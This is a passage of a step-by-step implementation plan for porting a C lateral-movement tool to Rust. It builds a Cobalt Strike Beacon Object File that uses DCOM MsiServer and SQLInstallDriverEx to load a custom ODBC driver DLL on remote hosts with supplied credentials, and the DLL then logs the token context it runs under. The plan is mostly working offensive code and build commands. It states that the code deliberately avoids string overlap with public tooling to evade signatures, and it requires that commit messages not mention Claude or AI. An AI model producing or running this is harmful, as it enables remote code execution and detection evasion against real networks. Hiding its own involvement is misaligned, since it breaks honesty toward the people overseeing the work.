  - `pub unsafe fn run(action: *mut IMsiCustomAction, drivername: *const u16, dllpath: *const u16) -> Result<(), HRESULT>`

Byte-count invariant: `driver_len` returned from the block builder must equal C's `sum(wcslen)+3+1` — three per-section NULs plus the final terminator (in wide-char units, matching what C passes to `SQLInstallDriverEx`).

- [ ] **Step 1: Read C reference**

```bash
sed -n '100,190p' msi_lateral_mv/bof/msi_lateral_mv.c
```

- [ ] **Step 2: Write `bof/src/deploy.rs`**

```rust
use core::ptr::null;
use windows_sys::core::HRESULT;
use windows_sys::Win32::UI::Shell::{PathFindFileNameW, PathRemoveFileSpecW};
use rustbof::{eprintln, println};

use crate::vtbl::IMsiCustomAction;

unsafe fn wlen(mut p: *const u16) -> usize {
    if p.is_null() { return 0; }
    let mut n = 0; while *p != 0 { n += 1; p = p.add(1); } n
}

unsafe fn wcopy(mut dst: *mut u16, mut src: *const u16) -> *mut u16 {
    while *src != 0 { *dst = *src; dst = dst.add(1); src = src.add(1); }
    *dst = 0; dst
}

unsafe fn build_block(
    drivername: *const u16, dll_filename: *const u16, out: &mut [u16; 512],
) -> i32 {
    let pfx_drv = [b'D' as u16, b'r' as u16, b'i' as u16, b'v' as u16, b'e' as u16, b'r' as u16, b'=' as u16];
    let pfx_set = [b'S' as u16, b'e' as u16, b't' as u16, b'u' as u16, b'p' as u16, b'=' as u16];
    let s1 = wlen(drivername);
    let sf = wlen(dll_filename);
    let s2 = pfx_drv.len() + sf;
    let s3 = pfx_set.len() + sf;

    let mut p = out.as_mut_ptr();
    p = wcopy(p, drivername); p = p.add(1);
    for &c in &pfx_drv { *p = c; p = p.add(1); }
    p = wcopy(p, dll_filename); p = p.add(1);
    for &c in &pfx_set { *p = c; p = p.add(1); }
    p = wcopy(p, dll_filename); p = p.add(1);
    *p = 0;
    (s1 + 1 + s2 + 1 + s3 + 1 + 1) as i32
}

pub unsafe fn run(
    action: *mut IMsiCustomAction, drivername: *const u16, dllpath: *const u16,
) -> Result<(), HRESULT> {
    let file = PathFindFileNameW(dllpath);
    let mut dir = [0u16; 260];
    let n = wlen(dllpath).min(259);
    for i in 0..n { dir[i] = *dllpath.add(i); }
    dir[n] = 0;
    PathRemoveFileSpecW(dir.as_mut_ptr());
    println!("payload.dir=@{:p}", dir.as_ptr());
    println!("payload.file=@{:p}", file);

    let mut info = [0u16; 512];
    let n_bytes = build_block(drivername, file, &mut info);

    let mut refs: u32 = 0;
    let mut raw_rc: i32 = 0;
    let mut path_out = [0u16; 256];
    let mut path_out_len: u16 = 0;

    println!("stage3a");
    let hr = ((*(*action).lpVtbl).SQLInstallDriverEx)(
        action, n_bytes, info.as_ptr(), dir.as_ptr(),
        path_out.as_mut_ptr(), path_out.len() as u16, &mut path_out_len,
        2, &mut refs, &mut raw_rc,
    );
    if hr < 0 || raw_rc == 0 {
        let mut ec: u32 = 0; let mut em = [0u16; 256]; let mut eml: u16 = 0;
        ((*(*action).lpVtbl).SQLInstallerError)(action, 1, &mut ec, em.as_mut_ptr(), em.len() as u16, &mut eml);
        eprintln!("stage3a rc=0x{:08X} code={}", hr as u32, raw_rc);
        return Err(hr);
    }
    println!("stage3a ok refs={}", refs);

    println!("stage3b");
    let mut msg = [0u16; 256]; let mut msg_len: u16 = 0; let mut cfg_rc: i32 = 0;
    let hr = ((*(*action).lpVtbl).SQLConfigDriver)(
        action, 1, drivername, null(), msg.as_mut_ptr(), msg.len() as u16, &mut msg_len, &mut cfg_rc,
    );
    if hr < 0 {
        let mut ec: u32 = 0; let mut em = [0u16; 256]; let mut eml: u16 = 0;
        ((*(*action).lpVtbl).SQLInstallerError)(action, 1, &mut ec, em.as_mut_ptr(), em.len() as u16, &mut eml);
        eprintln!("stage3b rc=0x{:08X}", hr as u32);
        return Err(hr);
    }
    println!("stage3b ok");
    Ok(())
}
```

- [ ] **Step 3: Wire main**

```rust
#![no_std]

mod argv;
mod deploy;
mod secure;
mod stage;
mod vtbl;

use rustbof::{eprintln, println};
use windows_sys::Win32::System::Com::CoUninitialize;

#[rustbof::main]
fn main(raw: *mut u8, len: usize) {
    let Some(a) = argv::parse(raw, len) else { return };
    let b = secure::build(a.domain, a.user, a.pass);
    unsafe {
        let srv = match stage::open_server(&b, a.host) {
            Ok(p) => p,
            Err(hr) => { eprintln!("stage1 rc=0x{:08X}", hr as u32); CoUninitialize(); return; }
        };
        let act = match stage::spawn_action(srv, &b) {
            Ok(p) => p,
            Err(hr) => {
                eprintln!("stage2 rc=0x{:08X}", hr as u32);
                ((*(*srv).lpVtbl).Release)(srv); CoUninitialize(); return;
            }
        };
        if let Err(hr) = deploy::run(act, a.driver, a.dll) {
            eprintln!("stage3 rc=0x{:08X}", hr as u32);
        } else {
            println!("done");
        }
        ((*(*act).lpVtbl).base.Release)(act as *mut vtbl::IUnknown);
        ((*(*srv).lpVtbl).Release)(srv);
        CoUninitialize();
    }
}
```

- [ ] **Step 4: Build + COFF sanity**

```bash
cd letmove_msi_ws/bof && cargo make
find target -name 'letmove_msi.o' -exec llvm-objdump -h {} \;   # or `objdump -h`
```
Expected: build succeeds, section list looks sane.

- [ ] **Step 5: Commit**

```bash
git add letmove_msi_ws/bof/src/deploy.rs letmove_msi_ws/bof/src/lib.rs
git commit -m "feat(deploy): install and configure the ODBC driver"
```

---

### Task 7: Driver crate (`driver/`) — Rust cdylib port

**Files:**
- Create: `letmove_msi_ws/driver/Cargo.toml`
- Create: `letmove_msi_ws/driver/src/lib.rs`
- Reference (read only): `msi_lateral_mv/sqldriverdll/TestDriver/dllmain.cpp`.

**Interfaces:**
- Exports (C ABI): `ConfigDriver(hwndParent: HWND, fRequest: u16, lpszDriver: *const u8, lpszArgs: *const u8, lpszMsg: *mut u8, cbMsgMax: u16, pcbMsgOut: *mut u16) -> i32` — signature matches ODBC `INSTAPI`.
- No inbound callers other than the ODBC installer driver management path.

Behaviour: on invocation, gather (username, user SID string, elevation yes/no, logon session id high/low, PID, integrity level) and append a single line to a log file. Log file path resolved at build time from env var `ODBCPIVOT_LOG`, else default `%PROGRAMDATA%\odbcpivot.dat`. Uses `CreateFileW` + `WriteFile` (no CRT / no `fopen_s`).

Strings: apply the driver-side rows of the String Refactor table verbatim.

- [ ] **Step 1: Read the C original**

```bash
cat msi_lateral_mv/sqldriverdll/TestDriver/dllmain.cpp
```

- [ ] **Step 2: `driver/Cargo.toml`**

```toml
[package]
name = "odbcpivot"
version = "0.1.0"
edition = "2024"
authors = ["daniagungg"]
publish = false

[lib]
name = "odbcpivot"
crate-type = ["cdylib"]

[dependencies.windows-sys]
version = "0.59"
features = [
    "Win32_Foundation",
    "Win32_Storage_FileSystem",
    "Win32_Security",
    "Win32_Security_Authorization",
    "Win32_System_Threading",
    "Win32_System_SystemInformation",
    "Win32_System_Memory",
    "Win32_UI_Shell",
]

[profile.release]
opt-level = "z"
codegen-units = 1
panic = "abort"
strip = true
lto = true
```

- [ ] **Step 3: `driver/src/lib.rs`**

```rust
#![no_std]
#![allow(non_snake_case)]

use core::ffi::c_void;
use core::ptr::{null, null_mut};

use windows_sys::Win32::Foundation::{
    CloseHandle, GetLastError, FALSE, HANDLE, TRUE,
};
use windows_sys::Win32::Security::{
    ConvertSidToStringSidW, GetSidSubAuthority, GetSidSubAuthorityCount,
    GetTokenInformation, TokenElevation, TokenIntegrityLevel, TokenStatistics,
    TokenUser, TOKEN_ELEVATION, TOKEN_MANDATORY_LABEL, TOKEN_QUERY,
    TOKEN_STATISTICS, TOKEN_USER,
};
use windows_sys::Win32::Security::Authorization::SECURITY_MANDATORY_LOW_RID;
use windows_sys::Win32::Storage::FileSystem::{
    CreateFileW, WriteFile, FILE_APPEND_DATA, FILE_ATTRIBUTE_NORMAL,
    FILE_SHARE_READ, OPEN_ALWAYS,
};
use windows_sys::Win32::System::Memory::{GetProcessHeap, HeapAlloc, HeapFree, HEAP_ZERO_MEMORY};
use windows_sys::Win32::System::Threading::{
    GetCurrentProcess, GetCurrentProcessId, OpenProcessToken,
};
use windows_sys::Win32::System::SystemInformation::GetLocalTime;
use windows_sys::Win32::UI::Shell::SHGetFolderPathW;

// Compile-time overridable log path. Windows-style, wide-encoded at runtime.
const LOG_ENV_DEFAULT: &str = "%PROGRAMDATA%\\odbcpivot.dat";
const LOG_PATH_ASCII: &str = match option_env!("ODBCPIVOT_LOG") {
    Some(s) => s,
    None    => LOG_ENV_DEFAULT,
};

// Integrity-level thresholds (windows-sys does not always export High/Medium).
const IL_LOW: u32 = 0x1000;
const IL_MEDIUM: u32 = 0x2000;
const IL_HIGH: u32 = 0x3000;

unsafe fn wide(s: &str, out: &mut [u16]) -> usize {
    // ASCII-only path expansion: replace %PROGRAMDATA% with SHGetFolderPath(CSIDL_COMMON_APPDATA=0x0023).
    let mut expanded = [0u16; 260];
    let mut idx = 0usize;
    let bytes = s.as_bytes();
    let mut i = 0;
    while i < bytes.len() && idx < expanded.len() - 1 {
        if bytes[i..].starts_with(b"%PROGRAMDATA%") {
            let mut folder = [0u16; 260];
            let hr = SHGetFolderPathW(null_mut(), 0x0023, null_mut(), 0, folder.as_mut_ptr());
            if hr == 0 {
                let mut j = 0;
                while j < folder.len() && folder[j] != 0 && idx < expanded.len() - 1 {
                    expanded[idx] = folder[j]; idx += 1; j += 1;
                }
            }
            i += b"%PROGRAMDATA%".len();
        } else {
            expanded[idx] = bytes[i] as u16; idx += 1; i += 1;
        }
    }
    let n = idx.min(out.len() - 1);
    for k in 0..n { out[k] = expanded[k]; }
    out[n] = 0;
    n
}

unsafe fn write_all(h: HANDLE, buf: &[u8]) {
    let mut w: u32 = 0;
    let _ = WriteFile(h, buf.as_ptr(), buf.len() as u32, &mut w, null_mut());
}

unsafe fn fmt_line(out: &mut [u8], line: &str) -> usize {
    let bytes = line.as_bytes();
    let n = bytes.len().min(out.len().saturating_sub(1));
    out[..n].copy_from_slice(&bytes[..n]);
    out[n] = b'\n';
    n + 1
}

// Minimal wide → utf8 stripping (ASCII assumption for log content).
unsafe fn wide_to_ascii(w: *const u16, out: &mut [u8]) -> usize {
    if w.is_null() { return 0; }
    let mut i = 0;
    while i < out.len() {
        let c = *w.add(i);
        if c == 0 { break; }
        out[i] = (c & 0xff) as u8;
        i += 1;
    }
    i
}

unsafe fn append_line(msg: &str) {
    let mut path = [0u16; 260];
    wide(LOG_PATH_ASCII, &mut path);
    let h = CreateFileW(
        path.as_ptr(),
        FILE_APPEND_DATA,
        FILE_SHARE_READ,
        null_mut(),
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        null_mut() as HANDLE,
    );
    if h.is_null() || h == core::mem::transmute::<i64, HANDLE>(-1i64) { return; }
    let mut buf = [0u8; 512];
    let n = fmt_line(&mut buf, msg);
    write_all(h, &buf[..n]);
    CloseHandle(h);
}

unsafe fn integrity_tag(rid: u32) -> &'static str {
    if rid >= IL_HIGH { "hi" }
    else if rid >= IL_MEDIUM { "med" }
    else if rid >= IL_LOW { "lo" }
    else if rid >= SECURITY_MANDATORY_LOW_RID { "lo" }
    else { "unt" }
}

unsafe fn collect_and_log() {
    // We build small ASCII lines; each line goes through append_line.
    let mut token: HANDLE = null_mut();
    if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) == FALSE {
        return;
    }

    // sub= (username via TokenUser + ConvertSidToStringSidW) — original C uses GetUserNameA.
    // For refactor purposes: emit sid= as the strong identifier, sub is optional.
    // Token user SID:
    let mut sz: u32 = 0;
    GetTokenInformation(token, TokenUser, null_mut(), 0, &mut sz);
    if sz > 0 {
        let p = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sz as usize) as *mut TOKEN_USER;
        if !p.is_null() && GetTokenInformation(token, TokenUser, p as *mut c_void, sz, &mut sz) != FALSE {
            let mut sid_w: *mut u16 = null_mut();
            if ConvertSidToStringSidW((*p).User.Sid, &mut sid_w) != FALSE {
                let mut b = [0u8; 128];
                let n = wide_to_ascii(sid_w, &mut b);
                let mut line = [0u8; 160];
                let head = b"sid=";
                let cap = line.len();
                let take = (head.len() + n).min(cap);
                line[..head.len()].copy_from_slice(head);
                line[head.len()..take].copy_from_slice(&b[..take - head.len()]);
                append_line(core::str::from_utf8_unchecked(&line[..take]));
                windows_sys::Win32::Foundation::LocalFree(sid_w as *mut _);
            }
            HeapFree(GetProcessHeap(), 0, p as *mut _);
        }
    }

    // elev=
    let mut el: TOKEN_ELEVATION = core::mem::zeroed();
    let mut szel = core::mem::size_of::<TOKEN_ELEVATION>() as u32;
    if GetTokenInformation(token, TokenElevation, &mut el as *mut _ as *mut c_void, szel, &mut szel) != FALSE {
        append_line(if el.TokenIsElevated != 0 { "elev=y" } else { "elev=n" });
    }

    // sess=
    let mut st: TOKEN_STATISTICS = core::mem::zeroed();
    let mut szst = core::mem::size_of::<TOKEN_STATISTICS>() as u32;
    if GetTokenInformation(token, TokenStatistics, &mut st as *mut _ as *mut c_void, szst, &mut szst) != FALSE {
        let mut buf = [0u8; 48];
        let n = u32_hex_pair(&mut buf, b"sess=", st.AuthenticationId.HighPart as u32, st.AuthenticationId.LowPart);
        append_line(core::str::from_utf8_unchecked(&buf[..n]));
    }

    // pid=
    {
        let mut buf = [0u8; 24];
        let n = u32_dec(&mut buf, b"pid=", GetCurrentProcessId());
        append_line(core::str::from_utf8_unchecked(&buf[..n]));
    }

    // il=
    let mut szi: u32 = 0;
    GetTokenInformation(token, TokenIntegrityLevel, null_mut(), 0, &mut szi);
    if szi > 0 {
        let p = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, szi as usize) as *mut TOKEN_MANDATORY_LABEL;
        if !p.is_null() && GetTokenInformation(token, TokenIntegrityLevel, p as *mut c_void, szi, &mut szi) != FALSE {
            let count = *GetSidSubAuthorityCount((*p).Label.Sid);
            let rid = *GetSidSubAuthority((*p).Label.Sid, (count - 1) as u32);
            let tag = integrity_tag(rid);
            let mut buf = [0u8; 32];
            let n = il_line(&mut buf, tag, rid);
            append_line(core::str::from_utf8_unchecked(&buf[..n]));
            HeapFree(GetProcessHeap(), 0, p as *mut _);
        }
    }

    CloseHandle(token);
}

unsafe fn u32_hex_pair(out: &mut [u8], prefix: &[u8], hi: u32, lo: u32) -> usize {
    let mut i = 0;
    for &c in prefix { out[i] = c; i += 1; }
    i += write_hex8(&mut out[i..], hi);
    i += write_hex8(&mut out[i..], lo);
    i
}

unsafe fn u32_dec(out: &mut [u8], prefix: &[u8], mut n: u32) -> usize {
    let mut i = 0;
    for &c in prefix { out[i] = c; i += 1; }
    let start = i;
    if n == 0 { out[i] = b'0'; i += 1; }
    else {
        let mut tmp = [0u8; 10];
        let mut t = 0;
        while n > 0 { tmp[t] = b'0' + (n % 10) as u8; n /= 10; t += 1; }
        while t > 0 { t -= 1; out[i] = tmp[t]; i += 1; }
    }
    i
}

unsafe fn il_line(out: &mut [u8], tag: &str, rid: u32) -> usize {
    let mut i = 0;
    let head = b"il=";
    for &c in head { out[i] = c; i += 1; }
    for &c in tag.as_bytes() { out[i] = c; i += 1; }
    out[i] = b'('; i += 1;
    i += write_hex8(&mut out[i..], rid);
    out[i] = b')'; i += 1;
    i
}

fn write_hex8(out: &mut [u8], v: u32) -> usize {
    const H: &[u8; 16] = b"0123456789ABCDEF";
    for k in 0..8 {
        out[k] = H[((v >> ((7 - k) * 4)) & 0xf) as usize];
    }
    8
}

#[unsafe(no_mangle)]
pub extern "system" fn DllMain(_: *mut c_void, _reason: u32, _: *mut c_void) -> i32 {
    TRUE
}

#[unsafe(no_mangle)]
pub extern "system" fn ConfigDriver(
    _hwndParent: *mut c_void,
    _fRequest: u16,
    _lpszDriver: *const u8,
    _lpszArgs: *const u8,
    _lpszMsg: *mut u8,
    _cbMsgMax: u16,
    _pcbMsgOut: *mut u16,
) -> i32 {
    unsafe {
        append_line("hit");
        collect_and_log();
    }
    TRUE
}

// Panic handler for no_std.
#[cfg(not(test))]
#[panic_handler]
fn on_panic(_: &core::panic::PanicInfo) -> ! { loop {} }
```

Notes:
- `no_std` chosen to avoid dragging in a full CRT; the driver runs inside the ODBC installer's process. If `windows-sys` items resolved above prove missing at your feature-set, add the corresponding `Win32_*` feature and adapt imports — do not rewrite the logic.
- `AuthenticationId.HighPart` is signed `i32` in some `windows-sys` versions; cast to `u32` as shown to keep the hex format printable.

- [ ] **Step 4: Build the driver**

```bash
cd letmove_msi_ws
cargo build -p odbcpivot --release --target x86_64-pc-windows-gnu
ls target/x86_64-pc-windows-gnu/release/odbcpivot.dll
```
Expected: `odbcpivot.dll` produced.

- [ ] **Step 5: Confirm `ConfigDriver` export**

```bash
llvm-objdump -x target/x86_64-pc-windows-gnu/release/odbcpivot.dll | grep -E 'Export|ConfigDriver'
# or on the DLL directly on Linux:
python3 -c "import pefile,sys; p=pefile.PE(sys.argv[1]); print([e.name.decode() for e in p.DIRECTORY_ENTRY_EXPORT.symbols])" target/x86_64-pc-windows-gnu/release/odbcpivot.dll
```
Expected: exports include `ConfigDriver` and `DllMain`.

- [ ] **Step 6: Commit**

```bash
git add letmove_msi_ws/driver/
git commit -m "feat(driver): rust cdylib odbcpivot with ConfigDriver export"
```

---

### Task 8: Repo docs — README + LICENSE

**Files:**
- Create: `letmove_msi_ws/README.md`
- Create: `letmove_msi_ws/LICENSE` (MIT, copyright `2026 daniagungg`)

- [ ] **Step 1: Write `letmove_msi_ws/README.md`**

```markdown
# letmove_msi_ws

Two Rust crates:

- `bof/` — `no_std` Beacon Object File (`letmove_msi.o`) for Cobalt Strike, using DCOM MsiServer + CreateCustomActionServer + SQLInstallDriverEx to install an ODBC driver on a local or remote host.
- `driver/` — sample ODBC driver DLL (`odbcpivot.dll`) exporting `ConfigDriver`.

Both crates deliberately avoid string overlap with prior public art.

## Build

```bash
# BoF (needs boflink + cargo-make)
cd bof && cargo make

# Driver (cross-compile from Linux/macOS)
rustup target add x86_64-pc-windows-gnu
cargo build -p odbcpivot --release --target x86_64-pc-windows-gnu
```

Artifacts:
- `bof/target/.../letmove_msi.o`
- `target/x86_64-pc-windows-gnu/release/odbcpivot.dll`

## BoF usage (Cobalt Strike aggressor)

Argument layout — 7 wide strings in order, empty string for absent fields:

```
letmove_msi <local|remote> <host> <domain> <user> <pass> <driver> <dll>
```

- `mode`: `local` | `remote`
- `host`: target hostname (required for `remote`)
- `domain` / `user` / `pass`: alternate credentials (empty = current)
- `driver`: ODBC driver name to register
- `dll`: full target-side path to the driver DLL (place `odbcpivot.dll` there first)

## Driver behaviour

`ConfigDriver` collects the current process token context and appends one line per field to a log file. Path is `%PROGRAMDATA%\odbcpivot.dat` by default; override at compile time with `ODBCPIVOT_LOG`.

## License

MIT.
```

- [ ] **Step 2: LICENSE**

Standard MIT text with `Copyright (c) 2026 daniagungg`.

- [ ] **Step 3: Commit**

```bash
git add letmove_msi_ws/README.md letmove_msi_ws/LICENSE
git commit -m "docs: add workspace README and license"
```

---

## Self-Review Notes

- Spec coverage: BoF (layout, args, data flow, COM, auth, error handling, build, testing) covered by Tasks 1–6; driver by Task 7; docs by Task 8.
- String-refactor scope: all upstream banners / log labels / paths mapped explicitly in §String Refactor. No task reintroduces upstream strings — Task 5 and Task 6 print the refactored forms; Task 7 uses the refactored driver labels and the new log path.
- Type consistency: `Args` shape stable from Task 3. `AuthBundle` shape stable from Task 4. Vtable slot signatures declared in Task 2 are called at Tasks 5 and 6 — mismatches must be fixed in Task 2, not at call sites.
- Commit messages contain no reference to Claude / AI / assistants.
